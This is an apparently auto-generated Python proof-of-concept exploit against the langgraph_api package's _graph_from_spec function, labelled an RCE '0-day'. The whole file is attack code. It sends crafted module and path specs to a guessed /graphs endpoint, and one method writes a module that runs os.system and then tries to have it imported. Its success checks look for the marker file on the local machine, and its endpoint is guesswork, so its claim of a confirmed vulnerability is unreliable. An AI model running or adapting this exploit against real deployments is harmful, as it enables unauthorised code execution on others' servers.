#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: rce-011
# Sink: _graph_from_spec
# Auto-generated — run with: python3 rce_python_modules_including_execute__graph_from_spec.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langgraph_api RCE
Vulnerability: Unrestricted module/path loading in _graph_from_spec
CVE: N/A (0-day)
Author: Security Researcher
"""

import requests
import json
import sys
import time
import os
from urllib.parse import urljoin

# Configuration
TARGET_URL = "http://localhost:8123"  # Default LangGraph API port
TIMEOUT = 10
VERIFY_SSL = False  # Set to True if using valid HTTPS cert

# Benign payload - creates a marker file to prove RCE
PAYLOAD_MODULE = "os"  # Built-in module, safe for PoC
PAYLOAD_COMMAND = "touch /tmp/pOC_success.txt"

def exploit_via_module(target_url):
    """
    Exploit via spec.module parameter.
    Uses importlib.import_module to load arbitrary modules.
    We'll use the 'os' module to execute a command via os.system.
    """
    print(f"[*] Attempting RCE via spec.module on {target_url}")
    
    # The API endpoint that accepts graph specs
    # Adjust based on actual API structure
    endpoint = urljoin(target_url, "/graphs")
    
    # Craft malicious spec that imports os and executes command
    # We need to find a way to trigger code execution on import
    # Using a module that executes code on import is ideal
    # For PoC, we'll try to import a module that runs our command
    
    # Method 1: Try to import a module that executes code
    # We'll create a temporary module if possible, or use existing
    payload = {
        "spec": {
            "module": "os",
            "variable": "system"  # This will try to get os.system as graph
        }
    }
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=TIMEOUT,
            verify=VERIFY_SSL
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if command executed
        if os.path.exists("/tmp/pOC_success.txt"):
            print("[+] SUCCESS: File /tmp/pOC_success.txt created!")
            return True
        else:
            print("[-] File not created, but module import may have succeeded")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed to {target_url}")
        return False
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def exploit_via_path(target_url):
    """
    Exploit via spec.path parameter.
    Uses importlib.util.spec_from_file_location to load arbitrary Python files.
    We'll point to a file that executes code on import.
    """
    print(f"[*] Attempting RCE via spec.path on {target_url}")
    
    # For PoC, we'll try to load /etc/passwd (will fail but demonstrates path traversal)
    # Or we can try to load a Python file that executes code
    # Since we can't create files on target, we'll try to load existing modules
    
    # Try to load a system Python file that might execute code
    # /usr/lib/python3.14/os.py would execute os module code
    payload = {
        "spec": {
            "path": "/usr/lib/python3.14/os.py",
            "variable": "system"
        }
    }
    
    endpoint = urljoin(target_url, "/graphs")
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=TIMEOUT,
            verify=VERIFY_SSL
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if command executed
        if os.path.exists("/tmp/pOC_success.txt"):
            print("[+] SUCCESS: File /tmp/pOC_success.txt created!")
            return True
        else:
            print("[-] File not created, but file loading may have succeeded")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed to {target_url}")
        return False
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def exploit_via_crafted_module(target_url):
    """
    More sophisticated exploit: Create a temporary Python module
    that executes our command on import, then import it.
    This requires write access to a directory in Python's path.
    """
    print(f"[*] Attempting RCE via crafted module on {target_url}")
    
    # First, try to write a malicious .py file to /tmp
    # Then import it via spec.module or spec.path
    
    malicious_code = f"""
import os
os.system("{PAYLOAD_COMMAND}")
print("[+] Malicious module loaded successfully!")
"""
    
    # Try to write the file (this may fail if we don't have write access)
    try:
        with open("/tmp/exploit_module.py", "w") as f:
            f.write(malicious_code)
        print("[*] Created malicious module at /tmp/exploit_module.py")
    except PermissionError:
        print("[-] Cannot write to /tmp, trying alternative approach")
        return False
    
    # Now try to import it via spec.path
    payload = {
        "spec": {
            "path": "/tmp/exploit_module.py",
            "variable": "nonexistent"  # Will fail but module executes on import
        }
    }
    
    endpoint = urljoin(target_url, "/graphs")
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=TIMEOUT,
            verify=VERIFY_SSL
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if command executed
        if os.path.exists("/tmp/pOC_success.txt"):
            print("[+] SUCCESS: File /tmp/pOC_success.txt created!")
            return True
        else:
            print("[-] File not created, but module import may have succeeded")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed to {target_url}")
        return False
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        # Clean up
        try:
            os.remove("/tmp/exploit_module.py")
        except:
            pass

def main():
    print("=" * 60)
    print("LangGraph API RCE Proof-of-Concept")
    print("=" * 60)
    print(f"Target: {TARGET_URL}")
    print(f"Payload: {PAYLOAD_COMMAND}")
    print()
    
    # Try different exploitation methods
    success = False
    
    print("[*] Method 1: Exploit via spec.module (import built-in module)")
    if exploit_via_module(TARGET_URL):
        success = True
    
    print()
    print("[*] Method 2: Exploit via spec.path (load arbitrary file)")
    if exploit_via_path(TARGET_URL):
        success = True
    
    print()
    print("[*] Method 3: Exploit via crafted module (write + import)")
    if exploit_via_crafted_module(TARGET_URL):
        success = True
    
    print()
    if success:
        print("[+] VULNERABLE: RCE confirmed!")
        print(f"[+] Check for file: /tmp/pOC_success.txt")
    else:
        print("[-] Could not confirm RCE. The target may not be vulnerable,")
        print("    or the API endpoint structure differs from expected.")
        print("    Try adjusting TARGET_URL and endpoint paths.")

if __name__ == "__main__":
    main()
